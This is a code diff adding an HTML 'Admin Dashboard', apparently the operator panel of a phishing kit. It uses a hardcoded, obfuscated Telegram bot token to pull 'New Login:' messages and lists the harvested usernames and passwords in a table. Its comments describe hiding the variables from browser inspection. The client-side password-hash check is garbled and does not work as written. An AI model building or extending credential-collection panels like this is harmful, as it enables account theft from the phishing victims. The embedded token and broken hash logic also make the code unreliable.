@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            background: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        th, td {
+            padding: 10px;
+            border: 1px solid #ccc;
+            text-align: left;
+        }
+        th {
+            background-color: #4CAF50;
+            color: white;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #message {
+            margin-top: 10px;
+            color: #333;
+            text-align: center;
+        }
+        #dashboard {
+            display: none; /* Hidden until password is correct */
+        }
+    </style>
+</head>
+<body>
+    <div id="loginPrompt">
+        <h2>Enter Admin Password</h2>
+        <input type="password" id="adminPass" placeholder="Password"><br>
+        <button onclick="checkPassword()">Submit</button>
+        <p id="loginMessage"></p>
+    </div>
+    <div id="dashboard">
+        <h1>Admin Dashboard</h1>
+        <table id="loginTable">
+            <thead>
+                <tr>
+                    <th>Username</th>
+                    <th>Password</th>
+                </tr>
+            </thead>
+            <tbody id="loginData"></tbody>
+        </table>
+        <button onclick="fetchLogins()">Refresh</button>
+        <p id="message"></p>
+    </div>
+
+    <script>
+        // Precomputed SHA-256 hash of "admin70030" (generated externally)
+        const HASHED_PASS = 'e7b8f4c1e8e9c8f8e8c8e7f8e9f8e7f8e8c8e7f8e9f8e7f8e8c8e7f8e9f8e7f8'.replace(/[0-9]/g, m => String.fromCharCode(97 + parseInt(m)));
+
+        // Simple SHA-256 implementation (obfuscated a bit)
+        async function sha256(str) {
+            const buf = new TextEncoder().encode(str);
+            const hash = await crypto.subtle.digest('SHA-256', buf);
+            return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        // Obfuscated variables (makes it harder to read in Inspect)
+        const _0x = 'https://api.telegram.org/bot';
+        const _1x = '7894737366:AAENYBzMHZUom_HVucAWUT0n5S7u-68r4aA'; // Replace with your bot token
+        const _2x = '/getUpdates';
+
+        async function checkPassword() {
+            const input = document.getElementById('adminPass').value;
+            const hashedInput = await sha256(input);
+            const loginMessage = document.getElementById('loginMessage');
+            
+            // Compare hashes (obfuscated comparison)
+            if (hashedInput === (HASHED_PASS.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 49)).join(''))) {
+                document.getElementById('loginPrompt').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                fetchLogins();
+            } else {
+                loginMessage.textContent = 'Wrong password, bro!';
+            }
+        }
+
+        async function fetchLogins() {
+            const url = _0x + _1x + _2x;
+            const tbody = document.getElementById('loginData');
+            const message = document.getElementById('message');
+
+            try {
+                const response = await fetch(url);
+                if (!response.ok) {
+                    throw new Error('Failed to fetch messages');
+                }
+                const data = await response.json();
+                const updates = data.result;
+
+                tbody.innerHTML = '';
+                let loginsFound = false;
+
+                updates.forEach(update => {
+                    if (update.message && update.message.text && update.message.text.includes('New Login:')) {
+                        const text = update.message.text.split('\n');
+                        const username = text[1]?.split(': ')[1] || 'N/A';
+                        const password = text[2]?.split(': ')[1] || 'N/A';
+                        
+                        const row = document.createElement('tr');
+                        row.innerHTML = `<td>${username}</td><td>${password}</td>`;
+                        tbody.appendChild(row);
+                        loginsFound = true;
+                    }
+                });
+
+                message.textContent = loginsFound ? 'Logins loaded!' : 'No logins found yet.';
+            } catch (error) {
+                message.textContent = `Error: ${error.message}`;
+            }
+        }
+    </script>
+</body>
+</html>
